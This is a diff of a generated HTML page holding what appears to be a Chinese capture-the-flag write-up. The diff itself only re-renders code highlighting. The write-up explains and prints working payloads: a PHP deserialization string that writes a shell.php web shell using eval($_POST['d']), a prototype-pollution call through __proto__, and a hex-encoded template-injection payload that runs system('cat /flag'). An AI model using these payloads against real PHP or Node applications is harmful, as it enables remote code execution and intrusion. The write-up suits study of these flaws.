@@ -79,7 +79,8 @@
   </script>
   <script  src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/utils.js" ></script>
   <script  src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Jesen's Blog" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -269,7 +270,7 @@
 <p>然后就是输出url编码的序列号字符串了：</p>
 <p> <img src="/images/image-20200824104121782.png" srcset="/img/loading.gif" lazyload alt="image-20200824104121782"></p>
 <p>然后访问: </p>
-<figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs js">/?flag=O%3A6%3A%22DB%5CJig%<span class="hljs-number">22</span>%3A6%3A%7Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00uuid%<span class="hljs-number">22</span>%3BN%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00dir%<span class="hljs-number">22</span>%3Bs%3A2%3A%<span class="hljs-number">22.</span>%2F%<span class="hljs-number">22</span>%3Bs%3A9%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00format%<span class="hljs-number">22</span>%3Bi%3A0%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00log%<span class="hljs-number">22</span>%3BN%3Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00data%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bs%3A9%3A%22shell.php%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%<span class="hljs-number">22</span>%3C%3Fphp+<span class="hljs-built_in">eval</span>%<span class="hljs-number">28</span>%24_POST%5B%27d%<span class="hljs-number">27</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E%<span class="hljs-number">22</span>%3B%7D%7Ds%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00lazy%<span class="hljs-number">22</span>%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs js">/?flag=O%3A6%3A%22DB%5CJig%<span class="hljs-number">22</span>%3A6%3A%7Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00uuid%<span class="hljs-number">22</span>%3BN%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00dir%<span class="hljs-number">22</span>%3Bs%3A2%3A%<span class="hljs-number">22.</span>%2F%<span class="hljs-number">22</span>%3Bs%3A9%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00format%<span class="hljs-number">22</span>%3Bi%3A0%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00log%<span class="hljs-number">22</span>%3BN%3Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00data%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bs%3A9%3A%22shell.<span class="hljs-property">php</span>%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%<span class="hljs-number">22</span>%3C%3Fphp+<span class="hljs-built_in">eval</span>%<span class="hljs-number">28</span>%24_POST%5B%27d%<span class="hljs-number">27</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E%<span class="hljs-number">22</span>%3B%7D%7Ds%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00lazy%<span class="hljs-number">22</span>%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure>
 
 <p>即可成功getshell</p>
 <p>然后通过phpinfo();查看环境变量里面的flag值即可。</p>
@@ -278,10 +279,10 @@
 <p>结果发现在__destruct中把trick1强制转为了字符串，直接变成了string(5) “Array”</p>
 <p>后来发现当浮点数过大的时候会变成INF</p>
 <p>所以让</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br><span class="hljs-keyword">$this</span>-&gt;trick2 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;trick1 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br><span class="hljs-variable language_">$this</span>-&gt;trick2 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br></code></pre></td></tr></table></figure>
 
 <p>最后得到序列化字符串：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick1&quot;</span>;d:INF;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick2&quot;</span>;d:INF;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick1&quot;</span>;d:INF;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick2&quot;</span>;d:INF;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>然后提交即可成功getflag</p>
 <h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h3><p>很明显考察原型链污染。</p>
@@ -289,10 +290,10 @@
 <p>GET访问/SpawnPoint初始化session</p>
 <p>查看代码发现使用 set-value，该js允许使用.来设置对应key的value</p>
 <p>那么我们可以看到：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> Admin = &#123;<br>    <span class="hljs-string">&quot;password1&quot;</span>:process.env.p1,<br>    <span class="hljs-string">&quot;password2&quot;</span>:process.env.p2,<br>    <span class="hljs-string">&quot;password3&quot;</span>:process.env.p3<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Admin</span> = &#123;<br>    <span class="hljs-string">&quot;password1&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p1</span>,<br>    <span class="hljs-string">&quot;password2&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p2</span>,<br>    <span class="hljs-string">&quot;password3&quot;</span>:process.<span class="hljs-property">env</span>.<span class="hljs-property">p3</span><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>那么我们可以通过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">setFn(req.session.knight, <span class="hljs-string">&quot;__proto__.password4&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">setFn</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">knight</span>, <span class="hljs-string">&quot;__proto__.password4&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>污染Admin这个object的键值对</p>
 <p><img src="/images/image-20200824104400190.png" srcset="/img/loading.gif" lazyload alt="image-20200824104400190"></p>
@@ -303,7 +304,7 @@
 <p>对于每一个xxx都会通过danger_key()过滤一下</p>
 <p>综合一下还是采用hex2bin配合array_map绕过，把system /catflag都转成hex(array_filter也可以)</p>
 <p>最终的payload为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?a=&#123;<span class="hljs-keyword">if</span>:array_map(hex2bin(<span class="hljs-string">&#x27;73797374656d&#x27;</span>),[hex2bin(<span class="hljs-string">&#x27;636174202f666c6167&#x27;</span>)])&#125;xxx&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?a=&#123;<span class="hljs-keyword">if</span>:<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&#x27;73797374656d&#x27;</span>),[<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&#x27;636174202f666c6167&#x27;</span>)])&#125;xxx&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="另一个"><a href="#另一个" class="headerlink" title="另一个"></a>另一个</h3><p>题目忘了，没做出来，后来看了一下，让子进程异常就行了。</p>
 
